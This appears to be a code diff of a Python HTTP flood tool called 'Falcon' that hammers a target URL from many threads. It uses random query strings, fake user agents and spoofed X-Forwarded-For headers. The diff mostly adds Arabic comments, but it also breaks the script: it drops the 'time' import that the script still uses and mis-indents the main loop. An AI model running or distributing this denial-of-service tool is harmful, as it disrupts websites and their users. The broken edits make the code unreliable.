@@ -4,7 +4,6 @@ import random
 import re
 import sys
 import os
-import time
 from colorama import Fore
 from threading import Thread, Lock
 from halo import Halo
@@ -12,6 +11,8 @@ from faker import Faker
 from fake_useragent import UserAgent
 from logo import logo
 
+# -------------------------
+# تعريف المتغيرات العالمية
 lock = Lock()
 fake = Faker()
 ua = UserAgent()
@@ -22,20 +23,27 @@ request_counter = 0
 flag = 0
 safe = False
 
+# معلومات الأداة
 __version__ = '2.5 BETA'
 __author__ = "Al-Mohammady Team"
 __method__ = 'HTTP V2 BETA'
 
+# -------------------------
+# تعريف الدوال
+
 def inc_counter():
+    """زيادة عداد الطلبات بطريقة آمنة للخيوط."""
     global request_counter
     with lock:
         request_counter += 1
 
 def set_flag(val):
+    """تعيين قيمة العلم."""
     global flag
     flag = val
 
 def set_safe():
+    """تعيين الوضع الآمن."""
     global safe
     safe = True
 
@@ -44,9 +52,11 @@ def buildblock(size):
     for _ in range(0, size):
         a = random.randint(65, 90)
         out_str += chr(a)
-    return out_str
+
+    return(out_str)
 
 def usage():
+    """عرض معلومات الاستخدام."""
     spinner = Halo()
     spinner.succeed(f'Version Script: {__version__}')
     spinner.succeed(f'Method: {__method__}')
@@ -54,6 +64,7 @@ def usage():
     print('-' * 40)
 
 def httpcall(url):
+    """إرسال طلب HTTP."""
     payload = f"{buildblock(random.randint(3, 15))}={buildblock(random.randint(3, 15))}"
     request_url = f"{url}?{payload}" if '?' not in url else f"{url}&{payload}"
     headers = {
@@ -69,6 +80,7 @@ def httpcall(url):
         "Connection": "keep-alive",
         "X-Forwarded-For": fake.ipv4(),
     }
+
     try:
         req = urllib.request.Request(request_url, headers=headers)
         urllib.request.urlopen(req)
@@ -77,9 +89,10 @@ def httpcall(url):
         set_flag(1)
         print(f"{Fore.RED}( {e.code} ) {Fore.MAGENTA}Response Code!")
     except Exception:
-        pass
+        pass  # تجاهل الأخطاء الأخرى
 
 def monitor_requests():
+    """مراقبة الطلبات المرسلة."""
     sent = 0
     previous = 0
     while flag == 0:
@@ -92,11 +105,14 @@ def monitor_requests():
         print(f"{Fore.RED}-- Falcon Attack Finished --{Fore.RESET}")
 
 def attack(url):
-    while flag < 2:
+    """تنفيذ الهجوم بدون توقف"""
+    while flag < 2:  # تأكد أن الهجوم يستمر طالما أن flag لم يتم إيقافه
         httpcall(url)
-        if safe:
+        if safe:  # في حالة تفعيل الـ Safe Mode، نبطئ الهجوم قليلاً
             time.sleep(0.1)
 
+# -------------------------
+# البرنامج الرئيسي
 if __name__ == "__main__":
     os.system('clear')
     logo()
@@ -107,7 +123,9 @@ if __name__ == "__main__":
         url += "/"
 
     host = re.search(r'(https?://)?([^/]*)/?.*', url).group(2)
+
     safe_option = input(f"{Fore.YELLOW}[ ? ] {Fore.GREEN}Enable Safe Mode (yes/no)=> ").strip().lower()
+
     thread_Num = int(input(f"{Fore.YELLOW}[ ? ] {Fore.GREEN}Threads => "))
     if safe_option == "yes":
         set_safe()
@@ -118,8 +136,9 @@ if __name__ == "__main__":
     with concurrent.futures.ThreadPoolExecutor(max_workers=thread_Num) as executor:
         try:
             while flag < 2:
-                futures = [executor.submit(attack, url) for _ in range(thread_Num)]
-                concurrent.futures.wait(futures, timeout=10)
+    futures = [executor.submit(attack, url) for _ in range(thread_Num)]
+    concurrent.futures.wait(futures, timeout=10)  # إعادة تشغيل الـ Threads كل 10 ثواني
+            concurrent.futures.wait(futures)
         except KeyboardInterrupt:
             set_flag(2)
-            print(f"{Fore.YELLOW}( FINISH ) {Fore.RED}Attack Stopped by user.{Fore.RESET}")
+            print(f"{Fore.YELLOW}( FINISH ) {Fore.RED}Attack Stoped by user.{Fore.RESET}")
